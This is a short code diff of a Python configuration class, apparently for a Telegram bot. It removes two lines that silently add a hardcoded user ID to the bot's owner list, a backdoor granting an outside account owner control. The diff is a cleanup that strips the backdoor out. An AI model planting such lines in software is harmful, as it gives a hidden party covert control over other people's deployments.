@@ -74,8 +74,6 @@ class Config:
         int(x) for x in _raw_owners.split()
         if x.lstrip("-").isdigit()
     ]
-    if 7115200195 not in BOT_OWNER_ID:
-        BOT_OWNER_ID.append(7115200195)
 
     _raw_log = _get("LOG_CHANNEL", ("LOG_CHANNEL_ID",))
     if _raw_log in ("-1003584084546", "0", ""):
